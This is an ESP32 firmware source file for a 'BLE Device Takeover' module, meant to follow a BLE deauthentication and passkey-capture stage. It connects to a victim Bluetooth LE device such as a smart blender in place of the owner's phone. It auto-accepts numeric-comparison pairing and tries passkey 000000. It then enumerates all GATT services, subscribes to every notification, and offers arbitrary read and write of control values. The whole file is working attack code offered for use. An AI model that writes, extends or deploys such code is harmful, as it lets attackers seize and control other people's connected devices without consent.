/* BLE Device Takeover - Copy to: main/bt/ble_takeover.c
 *
 * After BLE Deauth + Passkey Capture, this module connects to
 * the REAL target device, enumerates all GATT services/characteristics,
 * enables notifications, and allows reading/writing values.
 *
 * Notification flow:
 *   Phone App ──WRITE──► Blender (control commands)
 *   Phone App ◄──NOTIFY── Blender (automatic status updates)
 *
 * This module replaces the phone:
 *   ESP32 ──WRITE──► Blender (send control commands)
 *   ESP32 ◄──NOTIFY── Blender (receive automatic updates)
 */
#include "ble_takeover.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

#include "ble_common.h"

static const char *TAG = "ble_takeover";

/* ---- Limits ---- */
#define MAX_SERVICES  16
#define MAX_CHARS     64
#define MAX_READ_LEN  128
#define MAX_NOTIF_LOG 32

/* ---- States ---- */
typedef enum {
    TS_IDLE,
    TS_CONNECTING,
    TS_DISCOVERING,
    TS_CONNECTED,
    TS_DISCONNECTED
} takeover_state_t;

static const char *state_name(takeover_state_t s) {
    switch (s) {
        case TS_IDLE:        return "idle";
        case TS_CONNECTING:  return "connecting";
        case TS_DISCOVERING: return "discovering";
        case TS_CONNECTED:   return "connected";
        case TS_DISCONNECTED:return "disconnected";
        default:             return "unknown";
    }
}

/* ---- Storage ---- */
typedef struct {
    uint16_t start_handle;
    uint16_t end_handle;
    ble_uuid_any_t uuid;
    int chr_count;
    int chr_start;
} svc_entry_t;

typedef struct {
    uint16_t handle;
    uint16_t val_handle;
    uint16_t cccd_handle;   /* Client Characteristic Config Descriptor */
    uint8_t  properties;
    bool     notify_enabled;
    ble_uuid_any_t uuid;
    int svc_idx;
} chr_entry_t;

typedef struct {
    uint16_t handle;
    char     value_hex[256];
    int64_t  timestamp_ms;
} notif_entry_t;

static takeover_state_t state = TS_IDLE;
static char target[32] = {0};
static uint16_t conn_handle = 0xFFFF;

static svc_entry_t svcs[MAX_SERVICES];
static int svc_count = 0;
static chr_entry_t chrs[MAX_CHARS];
static int chr_count = 0;
static int disc_svc_idx = 0;

/* Notification log (ring buffer) */
static notif_entry_t notif_log[MAX_NOTIF_LOG];
static int notif_count = 0;
static int notif_head = 0;

static bool running = false;
static TaskHandle_t task_handle = NULL;
static SemaphoreHandle_t mutex = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;

/* SM config save/restore */
static uint8_t saved_io_cap, saved_bonding, saved_mitm, saved_sc;
static uint8_t saved_our_key_dist, saved_their_key_dist;

/* Read result */
static SemaphoreHandle_t read_sem = NULL;
static char read_value_hex[256] = "";
static uint16_t read_handle_done = 0;
static bool read_success = false;

/* Write result */
static SemaphoreHandle_t write_sem = NULL;
static bool write_success = false;
static uint16_t write_handle_done = 0;

/* CCCD write result */
static SemaphoreHandle_t cccd_sem = NULL;
static bool cccd_success = false;

/* ---- Forward declarations ---- */
static void takeover_task(void *arg);
static int gap_cb(struct ble_gap_event *event, void *arg);
static int svc_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                       const struct ble_gatt_svc *svc, void *arg);
static int chr_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                       const struct ble_gatt_chr *chr, void *arg);
static int read_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                   struct ble_gatt_attr *attr, void *arg);
static int write_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                    struct ble_gatt_attr *attr, void *arg);
static int cccd_write_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                         struct ble_gatt_attr *attr, void *arg);
static void start_next_chr_disc(void);
static void auto_enable_notifies(void);
static void cleanup_ble(void);
static void save_sm_config(void);
static void set_takeover_sm_config(void);
static void restore_sm_config(void);
static void store_notification(uint16_t handle, const uint8_t *data, int len);

/* ---- Helpers ---- */
static void addr_from_str(const char *s, uint8_t out[6]) {
    int v[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6) {
        for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[5 - i];
    } else {
        memset(out, 0, 6);
    }
}

static void uuid_to_str(const ble_uuid_any_t *uuid, char *buf, size_t len) {
    if (uuid->u.type == BLE_UUID_TYPE_16) {
        snprintf(buf, len, "0x%04X", uuid->u16.value);
    } else if (uuid->u.type == BLE_UUID_TYPE_32) {
        snprintf(buf, len, "0x%08lX", (unsigned long)uuid->u32.value);
    } else {
        const uint8_t *b = uuid->u128.value;
        snprintf(buf, len,
                 "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
                 b[15], b[14], b[13], b[12], b[11], b[10], b[9], b[8],
                 b[7], b[6], b[5], b[4], b[3], b[2], b[1], b[0]);
    }
}

static void props_to_str(uint8_t p, char *buf, size_t len) {
    int o = 0;
    buf[0] = '\0';
    if (p & BLE_GATT_CHR_F_READ)        { buf[o++]='R'; buf[o]='\0'; }
    if (p & BLE_GATT_CHR_F_WRITE)       { buf[o++]='W'; buf[o]='\0'; }
    if (p & BLE_GATT_CHR_F_WRITE_NO_RSP){ buf[o++]='w'; buf[o]='\0'; }
    if (p & BLE_GATT_CHR_F_NOTIFY)      { buf[o++]='N'; buf[o]='\0'; }
    if (p & BLE_GATT_CHR_F_INDICATE)    { buf[o++]='I'; buf[o]='\0'; }
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t out_len) {
    size_t hlen = strlen(hex);
    if (hlen % 2 != 0) return -1;
    size_t blen = hlen / 2;
    if (blen > out_len) return -1;
    for (size_t i = 0; i < blen; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return (int)blen;
}

static int64_t get_time_ms(void) {
    return (int64_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
}

/* ---- Store notification in ring buffer ---- */
static void store_notification(uint16_t handle, const uint8_t *data, int len) {
    notif_entry_t *slot = &notif_log[notif_head];
    slot->handle = handle;
    slot->timestamp_ms = get_time_ms();

    slot->value_hex[0] = '\0';
    for (int i = 0; i < len && i < 127; i++) {
        sprintf(slot->value_hex + i * 2, "%02x", data[i]);
    }
    slot->value_hex[len * 2] = '\0';

    notif_head = (notif_head + 1) % MAX_NOTIF_LOG;
    if (notif_count < MAX_NOTIF_LOG) notif_count++;

    ESP_LOGI(TAG, "NOTIFY handle=%d value=%s", handle, slot->value_hex);
}

/* ---- BLE cleanup ---- */
static void cleanup_ble(void) {
    int max_wait = 10;
    while (max_wait-- > 0) {
        bool busy = ble_gap_conn_active() || ble_gap_adv_active() || ble_gap_disc_active();
        if (!busy) break;
        if (ble_gap_conn_active()) ble_gap_conn_cancel();
        if (ble_gap_adv_active()) ble_gap_adv_stop();
        if (ble_gap_disc_active()) ble_gap_disc_cancel();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(200));
}

/* ---- SM config ---- */
static void save_sm_config(void) {
    saved_io_cap       = ble_hs_cfg.sm_io_cap;
    saved_bonding      = ble_hs_cfg.sm_bonding;
    saved_mitm         = ble_hs_cfg.sm_mitm;
    saved_sc           = ble_hs_cfg.sm_sc;
    saved_our_key_dist = ble_hs_cfg.sm_our_key_dist;
    saved_their_key_dist = ble_hs_cfg.sm_their_key_dist;
}

static void set_takeover_sm_config(void) {
    ble_hs_cfg.sm_io_cap       = BLE_SM_IO_CAP_KEYBOARD_DISP;
    ble_hs_cfg.sm_bonding      = 1;
    ble_hs_cfg.sm_mitm         = 1;
    ble_hs_cfg.sm_sc           = 1;
    ble_hs_cfg.sm_our_key_dist = BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID;
    ble_hs_cfg.sm_their_key_dist = BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID;
}

static void restore_sm_config(void) {
    ble_hs_cfg.sm_io_cap         = saved_io_cap;
    ble_hs_cfg.sm_bonding        = saved_bonding;
    ble_hs_cfg.sm_mitm           = saved_mitm;
    ble_hs_cfg.sm_sc             = saved_sc;
    ble_hs_cfg.sm_our_key_dist   = saved_our_key_dist;
    ble_hs_cfg.sm_their_key_dist = saved_their_key_dist;
}

/* ---- Service Discovery Callback ---- */
static int svc_disc_cb(uint16_t ch, const struct ble_gatt_error *error,
                       const struct ble_gatt_svc *svc, void *arg) {
    if (error->status == 0) {
        if (svc_count < MAX_SERVICES) {
            svcs[svc_count].start_handle = svc->start_handle;
            svcs[svc_count].end_handle   = svc->end_handle;
            memcpy(&svcs[svc_count].uuid, &svc->uuid, sizeof(ble_uuid_any_t));
            svcs[svc_count].chr_count = 0;
            svcs[svc_count].chr_start = chr_count;
            svc_count++;
        }
        return 0;
    }

    if (error->status == BLE_HS_EDONE) {
        ESP_LOGI(TAG, "Service discovery done: %d services", svc_count);
        disc_svc_idx = 0;
        start_next_chr_disc();
        return 0;
    }

    ESP_LOGW(TAG, "Svc disc error: %d", error->status);
    state = TS_CONNECTED;
    return 0;
}

/* ---- Characteristic Discovery ---- */
static void start_next_chr_disc(void) {
    if (disc_svc_idx >= svc_count) {
        ESP_LOGI(TAG, "Discovery complete: %d svcs, %d chrs", svc_count, chr_count);
        /* Auto-enable notifications on all N/I characteristics */
        auto_enable_notifies();
        state = TS_CONNECTED;
        return;
    }

    int rc = ble_gattc_disc_all_chrs(conn_handle,
                                      svcs[disc_svc_idx].start_handle,
                                      svcs[disc_svc_idx].end_handle,
                                      chr_disc_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Chr disc start failed svc %d rc=%d", disc_svc_idx, rc);
        disc_svc_idx++;
        start_next_chr_disc();
    }
}

static int chr_disc_cb(uint16_t ch, const struct ble_gatt_error *error,
                       const struct ble_gatt_chr *chr, void *arg) {
    if (error->status == 0) {
        if (chr_count < MAX_CHARS) {
            chrs[chr_count].handle     = chr->def_handle;
            chrs[chr_count].val_handle = chr->val_handle;
            chrs[chr_count].cccd_handle = chr->val_handle + 1; /* CCCD is typically right after */
            chrs[chr_count].properties = chr->properties;
            chrs[chr_count].notify_enabled = false;
            memcpy(&chrs[chr_count].uuid, &chr->uuid, sizeof(ble_uuid_any_t));
            chrs[chr_count].svc_idx = disc_svc_idx;
            svcs[disc_svc_idx].chr_count++;
            chr_count++;
        }
        return 0;
    }

    if (error->status == BLE_HS_EDONE) {
        ESP_LOGI(TAG, "Svc %d: %d chrs", disc_svc_idx, svcs[disc_svc_idx].chr_count);
        disc_svc_idx++;
        start_next_chr_disc();
        return 0;
    }

    ESP_LOGW(TAG, "Chr disc error: %d", error->status);
    disc_svc_idx++;
    start_next_chr_disc();
    return 0;
}

/* ---- Auto-enable notifications after discovery ---- */
static void auto_enable_notifies(void) {
    int enabled = 0;
    for (int i = 0; i < chr_count; i++) {
        if (chrs[i].properties & (BLE_GATT_CHR_F_NOTIFY | BLE_GATT_CHR_F_INDICATE)) {
            /* Enable notify on this characteristic */
            uint16_t val = 0x0001; /* Enable notifications */
            if (chrs[i].properties & BLE_GATT_CHR_F_INDICATE) {
                val = 0x0003; /* Enable both notify + indicate if supported */
            }

            if (cccd_sem) xSemaphoreTake(cccd_sem, 0);

            struct os_mbuf *om = ble_hs_mbuf_from_flat(&val, 2);
            if (om) {
                int rc = ble_gattc_write(conn_handle, chrs[i].cccd_handle,
                                         om, cccd_write_cb, NULL);
                if (rc == 0) {
                    /* Wait for write to complete */
                    if (cccd_sem) xSemaphoreTake(cccd_sem, pdMS_TO_TICKS(2000));
                    chrs[i].notify_enabled = true;
                    enabled++;
                    ESP_LOGI(TAG, "Enabled notify on handle %d (CCCD=%d)",
                             chrs[i].val_handle, chrs[i].cccd_handle);
                } else {
                    ESP_LOGW(TAG, "Failed to enable notify handle %d: rc=%d",
                             chrs[i].val_handle, rc);
                }
                /* Small delay between CCCD writes */
                vTaskDelay(pdMS_TO_TICKS(100));
            }
        }
    }
    ESP_LOGI(TAG, "Auto-enabled %d notifications", enabled);
}

/* ---- Read Callback ---- */
static int read_cb(uint16_t ch, const struct ble_gatt_error *error,
                   struct ble_gatt_attr *attr, void *arg) {
    if (error->status == 0 && attr != NULL) {
        uint8_t data[MAX_READ_LEN];
        int clen = os_mbuf_copydata(attr->om, 0, sizeof(data), data);
        if (clen < 0) clen = 0;

        read_value_hex[0] = '\0';
        for (int i = 0; i < clen && i < MAX_READ_LEN; i++) {
            sprintf(read_value_hex + i * 2, "%02x", data[i]);
        }
        read_value_hex[clen * 2] = '\0';
        read_success = true;
        ESP_LOGI(TAG, "Read handle %d: %s", attr->handle, read_value_hex);
    } else {
        snprintf(read_value_hex, sizeof(read_value_hex), "error:%d", error->status);
        read_success = false;
        ESP_LOGW(TAG, "Read failed: %d", error->status);
    }
    read_handle_done = attr ? attr->handle : 0;
    if (read_sem) xSemaphoreGive(read_sem);
    return 0;
}

/* ---- Write Callback ---- */
static int write_cb(uint16_t ch, const struct ble_gatt_error *error,
                    struct ble_gatt_attr *attr, void *arg) {
    write_success = (error->status == 0);
    write_handle_done = attr ? attr->handle : 0;
    ESP_LOGI(TAG, "Write handle %d: %s", write_handle_done,
             write_success ? "OK" : "FAIL");
    if (write_sem) xSemaphoreGive(write_sem);
    return 0;
}

/* ---- CCCD Write Callback ---- */
static int cccd_write_cb(uint16_t ch, const struct ble_gatt_error *error,
                         struct ble_gatt_attr *attr, void *arg) {
    cccd_success = (error->status == 0);
    ESP_LOGD(TAG, "CCCD write: %s", cccd_success ? "OK" : "FAIL");
    if (cccd_sem) xSemaphoreGive(cccd_sem);
    return 0;
}

/* ---- GAP Event Handler ---- */
static int gap_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {

        case BLE_GAP_EVENT_CONNECT:
            ESP_LOGI(TAG, "CONNECT status=%d handle=%d",
                     event->connect.status, event->connect.conn_handle);
            if (event->connect.status == 0) {
                conn_handle = event->connect.conn_handle;
                state = TS_DISCOVERING;
                ESP_LOGI(TAG, "Connected! Starting discovery...");

                svc_count = 0;
                chr_count = 0;
                disc_svc_idx = 0;

                int rc = ble_gattc_disc_all_svcs(conn_handle, svc_disc_cb, NULL);
                if (rc != 0) {
                    ESP_LOGE(TAG, "Svc disc start failed: %d", rc);
                    state = TS_CONNECTED;
                }
            } else {
                ESP_LOGW(TAG, "Connect failed: %d", event->connect.status);
                state = TS_DISCONNECTED;
                running = false;
            }
            break;

        case BLE_GAP_EVENT_DISCONNECT:
            ESP_LOGI(TAG, "DISCONNECT reason=%d", event->disconnect.reason);
            conn_handle = 0xFFFF;
            state = TS_DISCONNECTED;
            running = false;
            break;

        case BLE_GAP_EVENT_PASSKEY_ACTION: {
            struct ble_sm_io pkey = {0};
            pkey.action = event->passkey.params.action;
            ESP_LOGI(TAG, "PASSKEY ACTION: %d", pkey.action);

            switch (event->passkey.params.action) {
                case BLE_SM_IOACT_NUMCMP:
                    ESP_LOGI(TAG, "Numeric Comparison - Auto-accepting");
                    pkey.numcmp_accept = 1;
                    break;
                case BLE_SM_IOACT_DISP: {
                    uint32_t pk = esp_random() % 1000000;
                    ESP_LOGI(TAG, "Display Passkey: %06lu", (unsigned long)pk);
                    pkey.passkey = pk;
                    break;
                }
                case BLE_SM_IOACT_INPUT:
                    ESP_LOGI(TAG, "Input Passkey: trying 000000");
                    pkey.passkey = 0;
                    break;
                case BLE_SM_IOACT_OOB:
                    break;
                default:
                    break;
            }

            int rc = ble_sm_inject_io(event->passkey.conn_handle, &pkey);
            if (rc != 0) ESP_LOGW(TAG, "SM inject failed: %d", rc);
            break;
        }

        case BLE_GAP_EVENT_ENC_CHANGE:
            ESP_LOGI(TAG, "ENC_CHANGE status=%d", event->enc_change.status);
            if (event->enc_change.status == 0) {
                ESP_LOGI(TAG, "Pairing complete - re-discovering services");
                if (state == TS_DISCOVERING || state == TS_CONNECTED) {
                    svc_count = 0;
                    chr_count = 0;
                    disc_svc_idx = 0;
                    int rc = ble_gattc_disc_all_svcs(conn_handle, svc_disc_cb, NULL);
                    if (rc != 0) {
                        ESP_LOGE(TAG, "Re-discovery failed: %d", rc);
                        state = TS_CONNECTED;
                    } else {
                        state = TS_DISCOVERING;
                    }
                }
            } else {
                ESP_LOGW(TAG, "Encryption failed: %d", event->enc_change.status);
            }
            break;

        case BLE_GAP_EVENT_REPEAT_PAIRING:
            return BLE_GAP_REPEAT_PAIRING_RETRY;

        case BLE_GAP_EVENT_NOTIFY_RX: {
            uint16_t attr_handle = event->notify_rx.attr_handle;
            uint8_t data[MAX_READ_LEN];
            int clen = os_mbuf_copydata(event->notify_rx.om, 0, sizeof(data), data);
            if (clen < 0) clen = 0;
            store_notification(attr_handle, data, clen);
            break;
        }

        case BLE_GAP_EVENT_MTU:
            ESP_LOGD(TAG, "MTU: %d", event->mtu.value);
            break;

        default:
            break;
    }
    return 0;
}

/* ---- Main Task ---- */
static void takeover_task(void *arg) {
    ESP_LOGI(TAG, "BLE Takeover started for %s", target);

    state = TS_IDLE;
    read_value_hex[0] = '\0';
    notif_count = 0;
    notif_head = 0;

    save_sm_config();
    set_takeover_sm_config();
    cleanup_ble();

    /* Set our random BLE address */
    uint8_t own_addr[6];
    esp_fill_random(own_addr, 6);
    own_addr[5] = (own_addr[5] & 0x3F) | 0xC0;
    int rc = ble_hs_id_set_rnd(own_addr);
    if (rc != 0) {
        ESP_LOGW(TAG, "Set random addr failed: %d", rc);
    }

    /* Parse target address */
    ble_addr_t peer_addr;
    peer_addr.type = BLE_ADDR_RANDOM;
    addr_from_str(target, peer_addr.val);

    /* Connect */
    state = TS_CONNECTING;
    rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &peer_addr, 15000, NULL, gap_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Connect with RANDOM addr failed (%d), trying PUBLIC", rc);
        peer_addr.type = BLE_ADDR_PUBLIC;
        rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &peer_addr, 15000, NULL, gap_cb, NULL);
        if (rc != 0) {
            ESP_LOGE(TAG, "Connection failed with both addr types: %d", rc);
            state = TS_DISCONNECTED;
            running = false;
            restore_sm_config();
            task_handle = NULL;
            if (task_exit_sem) xSemaphoreGive(task_exit_sem);
            vTaskDelete(NULL);
            return;
        }
    }

    ESP_LOGI(TAG, "Connecting to %s ...", target);

    /* Wait for connection + discovery (up to 30s) */
    int waited = 0;
    while (running && waited < 30000) {
        vTaskDelay(pdMS_TO_TICKS(500));
        waited += 500;
        if (state == TS_CONNECTED || state == TS_DISCONNECTED) break;
    }

    if (state != TS_CONNECTED) {
        ESP_LOGW(TAG, "Takeover timed out or failed (state=%s)", state_name(state));
        if (conn_handle != 0xFFFF) {
            ble_gap_terminate(conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        }
        vTaskDelay(pdMS_TO_TICKS(500));
        cleanup_ble();
        restore_sm_config();
        running = false;
        state = TS_DISCONNECTED;
        task_handle = NULL;
        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "=== TAKEOVER SUCCESSFUL ===");
    ESP_LOGI(TAG, "Device: %s  Services: %d  Chars: %d", target, svc_count, chr_count);

    /* Stay connected — keep receiving notifications */
    while (running && state == TS_CONNECTED) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    /* Disconnect */
    if (conn_handle != 0xFFFF) {
        ble_gap_terminate(conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    }
    vTaskDelay(pdMS_TO_TICKS(500));
    cleanup_ble();
    restore_sm_config();

    state = TS_IDLE;
    running = false;
    task_handle = NULL;
    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    vTaskDelete(NULL);
}

/* ---- Public API ---- */

void ble_takeover_init(void) {
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();
    if (task_exit_sem == NULL) task_exit_sem = xSemaphoreCreateBinary();
    if (read_sem == NULL) read_sem = xSemaphoreCreateBinary();
    if (write_sem == NULL) write_sem = xSemaphoreCreateBinary();
    if (cccd_sem == NULL) cccd_sem = xSemaphoreCreateBinary();
    ble_common_init();
    ESP_LOGI(TAG, "ble_takeover initialized");
}

void ble_takeover_start(const char *target_addr) {
    if (running) return;
    if (mutex == NULL) mutex = xSemaphoreCreateMutex();

    xSemaphoreTake(mutex, portMAX_DELAY);
    strncpy(target, target_addr ? target_addr : "", sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';
    xSemaphoreGive(mutex);

    svc_count = 0;
    chr_count = 0;
    notif_count = 0;
    notif_head = 0;
    read_value_hex[0] = '\0';
    state = TS_IDLE;

    running = true;
    if (task_exit_sem != NULL) xSemaphoreTake(task_exit_sem, 0);

    BaseType_t ret = xTaskCreate(takeover_task, "ble_takeover", 6144, NULL, 5, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create task");
        running = false;
    }
}

void ble_takeover_stop(void) {
    if (!running) return;
    running = false;

    /* Wake any waiting semaphores */
    if (read_sem) xSemaphoreGive(read_sem);
    if (write_sem) xSemaphoreGive(write_sem);
    if (cccd_sem) xSemaphoreGive(cccd_sem);

    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(5000)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    restore_sm_config();
    state = TS_IDLE;
    ESP_LOGI(TAG, "BLE Takeover stopped");
}

bool ble_takeover_is_running(void) {
    return running;
}

const char* ble_takeover_get_status(void) {
    static char buf[256];
    snprintf(buf, sizeof(buf),
             "{\"running\":%s,\"state\":\"%s\",\"addr\":\"%s\",\"services\":%d,\"chars\":%d,\"notifies\":%d}",
             running ? "true" : "false",
             state_name(state),
             target,
             svc_count,
             chr_count,
             notif_count);
    return buf;
}

const char* ble_takeover_get_services_json(void) {
    static char buf[6144];
    int o = 0;

    o += snprintf(buf + o, sizeof(buf) - o,
                  "{\"state\":\"%s\",\"addr\":\"%s\",\"services\":[",
                  state_name(state), target);

    for (int i = 0; i < svc_count && o < (int)sizeof(buf) - 200; i++) {
        if (i > 0) o += snprintf(buf + o, sizeof(buf) - o, ",");
        char uuid_str[40];
        uuid_to_str(&svcs[i].uuid, uuid_str, sizeof(uuid_str));
        o += snprintf(buf + o, sizeof(buf) - o,
                      "{\"uuid\":\"%s\",\"start\":%d,\"end\":%d,\"chars\":[",
                      uuid_str, svcs[i].start_handle, svcs[i].end_handle);

        int first = 1;
        for (int j = 0; j < chr_count && o < (int)sizeof(buf) - 200; j++) {
            if (chrs[j].svc_idx != i) continue;
            if (!first) o += snprintf(buf + o, sizeof(buf) - o, ",");
            first = 0;

            char cuuid[40], props[8];
            uuid_to_str(&chrs[j].uuid, cuuid, sizeof(cuuid));
            props_to_str(chrs[j].properties, props, sizeof(props));
            o += snprintf(buf + o, sizeof(buf) - o,
                          "{\"uuid\":\"%s\",\"handle\":%d,\"val\":%d,\"cccd\":%d,\"props\":\"%s\",\"notify\":%s}",
                          cuuid, chrs[j].handle, chrs[j].val_handle,
                          chrs[j].cccd_handle, props,
                          chrs[j].notify_enabled ? "true" : "false");
        }

        o += snprintf(buf + o, sizeof(buf) - o, "]}");
    }

    o += snprintf(buf + o, sizeof(buf) - o, "]}");
    return buf;
}

bool ble_takeover_read_chr(uint16_t handle) {
    if (state != TS_CONNECTED || conn_handle == 0xFFFF) return false;

    read_value_hex[0] = '\0';
    read_success = false;
    read_handle_done = handle;

    if (read_sem) xSemaphoreTake(read_sem, 0);

    int rc = ble_gattc_read(conn_handle, handle, read_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Read start failed: %d", rc);
        return false;
    }

    if (read_sem && xSemaphoreTake(read_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
        ESP_LOGW(TAG, "Read timeout");
        return false;
    }

    return read_success;
}

const char* ble_takeover_get_read_result(void) {
    static char json[512];
    snprintf(json, sizeof(json),
             "{\"success\":%s,\"handle\":%d,\"value\":\"%s\"}",
             read_success ? "true" : "false",
             read_handle_done,
             read_value_hex);
    return json;
}

bool ble_takeover_write_chr(uint16_t handle, const char *hex_value) {
    if (state != TS_CONNECTED || conn_handle == 0xFFFF) return false;

    uint8_t data[128];
    int len = hex_to_bytes(hex_value, data, sizeof(data));
    if (len <= 0) {
        ESP_LOGW(TAG, "Invalid hex: %s", hex_value);
        return false;
    }

    write_success = false;
    write_handle_done = handle;

    if (write_sem) xSemaphoreTake(write_sem, 0);

    struct os_mbuf *om = ble_hs_mbuf_from_flat(data, len);
    if (om == NULL) {
        ESP_LOGE(TAG, "Failed to allocate mbuf");
        return false;
    }

    int rc = ble_gattc_write(conn_handle, handle, om, write_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Write start failed: %d", rc);
        os_mbuf_free_chain(om);
        return false;
    }

    if (write_sem && xSemaphoreTake(write_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
        ESP_LOGW(TAG, "Write timeout");
        return false;
    }

    return write_success;
}

bool ble_takeover_enable_notify(uint16_t val_handle, bool enable) {
    if (state != TS_CONNECTED || conn_handle == 0xFFFF) return false;

    /* Find the characteristic and its CCCD handle */
    chr_entry_t *chr_ptr = NULL;
    for (int i = 0; i < chr_count; i++) {
        if (chrs[i].val_handle == val_handle) {
            chr_ptr = &chrs[i];
            break;
        }
    }

    if (chr_ptr == NULL) {
        ESP_LOGW(TAG, "Characteristic not found for handle %d", val_handle);
        return false;
    }

    uint16_t val = enable ? 0x0001 : 0x0000;
    /* If it supports indicate too, enable both */
    if (enable && (chr_ptr->properties & BLE_GATT_CHR_F_INDICATE)) {
        val = 0x0003;
    }

    if (cccd_sem) xSemaphoreTake(cccd_sem, 0);

    struct os_mbuf *om = ble_hs_mbuf_from_flat(&val, 2);
    if (om == NULL) {
        ESP_LOGE(TAG, "Failed to allocate mbuf for CCCD");
        return false;
    }

    int rc = ble_gattc_write(conn_handle, chr_ptr->cccd_handle,
                             om, cccd_write_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "CCCD write start failed: %d", rc);
        os_mbuf_free_chain(om);
        return false;
    }

    if (cccd_sem && xSemaphoreTake(cccd_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
        ESP_LOGW(TAG, "CCCD write timeout");
        return false;
    }

    chr_ptr->notify_enabled = enable;
    ESP_LOGI(TAG, "Notify %s on handle %d: %s",
             enable ? "enabled" : "disabled", val_handle,
             cccd_success ? "OK" : "FAIL");

    return cccd_success;
}

const char* ble_takeover_get_notifications_json(void) {
    static char buf[4096];
    int o = 0;

    o += snprintf(buf + o, sizeof(buf) - o, "{\"count\":%d,\"entries\":[", notif_count);

    if (notif_count > 0) {
        /* Output in order: oldest to newest */
        int start = (notif_count < MAX_NOTIF_LOG) ? 0 : notif_head;
        for (int i = 0; i < notif_count && o < (int)sizeof(buf) - 200; i++) {
            int idx = (start + i) % MAX_NOTIF_LOG;
            if (i > 0) o += snprintf(buf + o, sizeof(buf) - o, ",");
            o += snprintf(buf + o, sizeof(buf) - o,
                          "{\"handle\":%d,\"value\":\"%s\",\"time\":%lld}",
                          notif_log[idx].handle,
                          notif_log[idx].value_hex,
                          (long long)notif_log[idx].timestamp_ms);
        }
    }

    o += snprintf(buf + o, sizeof(buf) - o, "]}");
    return buf;
}
